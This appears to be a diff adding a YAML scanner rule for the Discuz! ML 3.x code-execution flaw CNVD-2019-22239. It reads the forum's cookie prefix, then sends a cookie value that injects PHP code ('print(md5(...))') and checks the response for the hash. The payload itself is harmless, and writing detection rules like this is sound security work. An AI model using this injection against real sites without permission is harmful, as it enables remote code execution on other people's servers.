@@ -1,0 +1,21 @@
+name: discuz-ml3x-cnvd-2019-22239
+description: >
+  命令执行
+alwaysExecute: false
+matchCount: 2
+rules:
+  - method: GET
+    path: /forum.php
+    follow_redirects: false
+    expression:
+      status: 200
+    search: cookiepre = '(?P<token>[\w_]+)'
+  - method: GET
+    path: /forum.php
+    headers:
+      Cookie: "{{token}}language=sc'.print(md5(12345678)).'"
+    follow_redirects: false
+    expression: 
+      status: 200
+      body_all:
+        - "25d55ad283aa400af464c76d713c07ad"
